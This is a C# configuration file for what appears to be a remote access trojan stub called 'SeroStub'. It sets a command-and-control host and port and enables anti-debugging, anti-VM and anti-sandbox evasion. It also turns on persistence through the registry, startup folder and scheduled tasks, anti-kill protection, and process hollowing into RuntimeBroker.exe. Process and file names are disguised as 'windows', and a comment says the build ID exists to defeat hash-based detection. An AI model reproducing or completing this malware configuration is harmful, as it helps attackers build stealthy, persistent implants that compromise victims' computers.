namespace SeroStub;

internal static class Config
{
    public const string Host = "127.0.0.1";
    public const int Port = 7777;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}";

    public const bool AntiDebug = true;
    public const bool AntiVM = true;
    public const bool AntiDetect = true;
    public const bool AntiSandbox = true;

    public const bool PersistRegistry = true;
    public const bool PersistStartup = true;
    public const bool PersistTask = true;
    public const string PersistName = "Windows";

    public const bool AntiKill = true;
    public const bool EnableWatchdog = true;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "RuntimeBroker.exe";

    public const string AuthKey = "wwY7tgpOQH0bI4GpfxkPdQc8LhUI4qVL";
    public const string CertHash = "EA1E00A57AB53E2DCFEC3729590EE4441218DD3758C38210A7916A872AF43382";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "d3bf28c549314f4bb7d687fe089a829d";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 10000;

    public const string ClientIdPrefix = "Client";

    public const string HiddenProcessName = "windows";
    public const string HiddenFileName = "windows.exe";
    public const string HiddenRegKey = "Windows";
}
